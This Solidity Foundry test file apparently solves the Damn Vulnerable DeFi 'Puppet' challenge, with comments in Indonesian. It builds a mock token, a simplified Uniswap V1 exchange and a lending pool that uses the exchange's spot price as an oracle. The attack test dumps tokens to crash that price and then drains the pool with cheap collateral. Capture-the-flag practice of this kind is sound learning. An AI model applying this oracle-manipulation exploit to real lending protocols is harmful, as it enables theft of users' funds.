// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// --- 1. MOCK TOKEN ---
contract DamnValuableToken {
    string public name = "DamnValuableToken";
    string public symbol = "DVT";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) public {
        balanceOf[to] += amount;
        totalSupply += amount;
    }
    function approve(address spender, uint256 amount) public returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
    function transfer(address to, uint256 amount) public returns (bool) {
        return transferFrom(msg.sender, to, amount);
    }
    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        require(balanceOf[from] >= amount, "Insufficient balance");
        if (from != msg.sender && allowance[from][msg.sender] != type(uint256).max) {
            require(allowance[from][msg.sender] >= amount, "Allowance exceeded");
            allowance[from][msg.sender] -= amount;
        }
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

// --- 2. MOCK UNISWAP V1 EXCHANGE (Sangat Disederhanakan) ---
// Uniswap V1 aslinya rumit, ini versi minimalis untuk simulasi swap & price check
contract UniswapExchange {
    address public tokenAddress;
    DamnValuableToken token;

    constructor(address _token) {
        tokenAddress = _token;
        token = DamnValuableToken(_token);
    }

    // Fungsi buat nambah likuiditas awal
    function addLiquidity(uint256 min_liquidity, uint256 max_tokens, uint256 deadline) external payable returns (uint256) {
        token.transferFrom(msg.sender, address(this), max_tokens);
        return max_tokens; 
    }

    // 1. Fungsi Swap: Jual Token -> Dapat ETH
    // (Ini yang bikin harga token hancur)
    function tokenToEthSwapInput(uint256 tokens_sold, uint256 min_eth, uint256 deadline) external returns (uint256) {
        uint256 tokenReserve = token.balanceOf(address(this));
        uint256 ethReserve = address(this).balance;
        
        // Rumus Uniswap: x * y = k
        // Kita jual token, berarti input amount masuk, ETH keluar.
        // Output ETH = (InputAmount * 997 * EthReserve) / (TokenReserve * 1000 + InputAmount * 997)
        // (Ada fee 0.3%)
        
        uint256 inputAmountWithFee = tokens_sold * 997;
        uint256 numerator = inputAmountWithFee * ethReserve;
        uint256 denominator = (tokenReserve * 1000) + inputAmountWithFee;
        uint256 ethBought = numerator / denominator;

        require(ethBought >= min_eth, "Slippage too high");

        token.transferFrom(msg.sender, address(this), tokens_sold);
        payable(msg.sender).transfer(ethBought);
        
        return ethBought;
    }

    // 2. Fungsi Oracle: Dipanggil oleh PuppetPool untuk cek harga
    // Berapa ETH yang didapat kalau jual 1 Token?
    function getTokenToEthInputPrice(uint256 tokens_sold) external view returns (uint256) {
        require(tokens_sold > 0, "Too small");
        uint256 tokenReserve = token.balanceOf(address(this));
        uint256 ethReserve = address(this).balance;
        
        uint256 inputAmountWithFee = tokens_sold * 997;
        uint256 numerator = inputAmountWithFee * ethReserve;
        uint256 denominator = (tokenReserve * 1000) + inputAmountWithFee;
        return numerator / denominator;
    }

    receive() external payable {}
}

// --- 3. PUPPET POOL (Target) ---
contract PuppetPool {
    mapping(address => uint256) public deposits;
    address public uniswapPair;
    DamnValuableToken public token;

    event Borrowed(address indexed account, uint256 depositRequired, uint256 borrowAmount);

    constructor(address _token, address _uniswapPair) {
        token = DamnValuableToken(_token);
        uniswapPair = _uniswapPair;
    }

    // Hitung deposit: Pinjam token senilai 2x harga ETH-nya
    function calculateDepositRequired(uint256 amount) public view returns (uint256) {
        // Tanya harga ke Uniswap (Oracle)
        uint256 price = UniswapExchange(payable(uniswapPair)).getTokenToEthInputPrice(1 ether);
        
        // Rumus: amount * price * 2 / 1 ether
        return amount * price * 2 / 1 ether;
    }

    function borrow(uint256 borrowAmount) external payable {
        uint256 depositRequired = calculateDepositRequired(borrowAmount);
        
        require(msg.value >= depositRequired, "Not enough collateral");
        
        if (msg.value > depositRequired) {
            payable(msg.sender).transfer(msg.value - depositRequired);
        }

        require(token.balanceOf(address(this)) >= borrowAmount, "Not enough liquidity");
        deposits[msg.sender] += depositRequired;
        require(token.transfer(msg.sender, borrowAmount), "Transfer failed");

        emit Borrowed(msg.sender, depositRequired, borrowAmount);
    }
}

// --- 4. TEST SCRIPT (THE ATTACK) ---
contract PuppetChallenge is Test {
    DamnValuableToken token;
    UniswapExchange uniswapExchange;
    PuppetPool puppetPool;
    
    address attacker = address(0x1337);

    function setUp() public {
        // 1. Deploy Contracts
        token = new DamnValuableToken();
        uniswapExchange = new UniswapExchange(address(token));
        puppetPool = new PuppetPool(address(token), address(uniswapExchange));

        // 2. Setup Skenario Awal
        // Uniswap: 10 ETH & 10 DVT (Likuiditas Tipis)
        token.mint(address(this), 10 ether); 
        token.approve(address(uniswapExchange), 10 ether);
        uniswapExchange.addLiquidity{value: 10 ether}(1, 10 ether, block.timestamp + 100);

        // PuppetPool: 100.000 DVT (Target Curian)
        token.mint(address(puppetPool), 100_000 ether);

        // Attacker: Punya 1000 DVT & 25 ETH
        token.mint(attacker, 1_000 ether);
        vm.deal(attacker, 25 ether);
    }

    function test_Puppet_Attack() public {
        vm.startPrank(attacker);

        // --- STEP 1: PERSIAPAN ---
        uint256 poolBalance = token.balanceOf(address(puppetPool));
        uint256 myTokenBalance = token.balanceOf(attacker);
        
        console.log("Harga Awal (Jaminan untuk pinjam 100k):", puppetPool.calculateDepositRequired(poolBalance));
        
        // --- STEP 2: DUMPING (Hancurkan Harga) ---
        // Approve Uniswap buat jual token kita
        token.approve(address(uniswapExchange), myTokenBalance);
        
        // Jual SEMUA (1000) token kita ke Uniswap
        // tokenToEthSwapInput(jumlahJual, minTerima, deadline)
        uniswapExchange.tokenToEthSwapInput(myTokenBalance, 1, block.timestamp + 100);

        // --- STEP 3: CEK HARGA BARU ---
        uint256 collateralNeeded = puppetPool.calculateDepositRequired(poolBalance);
        console.log("Harga SETELAH DUMP (Jaminan untuk pinjam 100k):", collateralNeeded);
        
        // Bandingkan: Harusnya sekarang jaminannya jadi murah banget (di bawah 25 ETH)

        // --- STEP 4: BORROW (Kuras Pool) ---
        // Kita pinjam semua isi pool dengan jaminan murah
        puppetPool.borrow{value: collateralNeeded}(poolBalance);

        vm.stopPrank();

        // VERIFIKASI
        // Attacker harus punya token lebih dari 100.000 (Pool + Sisa)
        uint256 finalBalance = token.balanceOf(attacker);
        console.log("Attacker Final Token Balance:", finalBalance);
        
// Kita cek apakah pool sudah kosong melompong
assertEq(token.balanceOf(address(puppetPool)), 0);
    }
}